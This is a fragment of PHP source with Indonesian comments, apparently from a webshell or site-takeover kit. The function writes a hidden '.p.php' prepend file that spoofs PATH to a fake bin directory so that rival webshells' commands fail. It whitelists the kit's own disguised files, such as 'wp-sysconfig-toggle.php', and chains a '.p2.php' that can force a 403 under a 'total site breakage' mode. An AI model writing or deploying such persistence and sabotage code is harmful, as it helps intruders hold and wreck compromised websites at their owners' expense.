   @putenv('PATH=<fakebin>') lalu SELESAI: TANPA header 403, TANPA exit.
   Halaman/domain PHP render NORMAL (isi web TIDAK dirusak); yang kena hanya
   perintah shell naif dari webshell ('function disable!!', exit 127).
   CHAINING GSP_CHAIN67 dihidupkan lagi (ala v66.7.1): sebelum putenv, include
   .p2.php di folder yang sama BILA ADA — jadi kalau RUSAK TOTAL WEB juga ON,
   403 keras tetap menang meski .user.ini last-wins menunjuk .p.php.
   $fake = path fakebin AKTUAL hasil resolve (gsp_fakebin_dir). */
function gsp_prepend_write($fake) {
    $sf = isset($_SERVER['SCRIPT_FILENAME']) ? basename(strval($_SERVER['SCRIPT_FILENAME'])) : '';
    $sf = str_replace(array('\\', "'"), '', $sf);
    $fake = str_replace(array('\\', "'"), '', strval($fake));
    $c = "<?php\n"
        . "/* #GSFURUSAK */\n"
        . "\$gsp_sf = isset(\$_SERVER['SCRIPT_FILENAME']) ? basename(\$_SERVER['SCRIPT_FILENAME']) : '';\n"
        . "\$gsp_ok = array('" . $sf . "', 'rusak_toggle.php', 'wp-sysconfig-toggle.php', 'upload.php', 'wp-media-upload.php');\n"
        . "if (!in_array(\$gsp_sf, \$gsp_ok, true)) {\n"
        . "    if (!defined('GSP_CHAIN67')) { define('GSP_CHAIN67', 1); \$gsp_sib = dirname(__FILE__) . '/.p2.php'; if (@is_file(\$gsp_sib)) include \$gsp_sib; }\n"
        . "    @putenv('PATH=" . $fake . "');\n"
        . "}\n";
    return gsp_rusak_write('.p.php', $c, 0644);
}
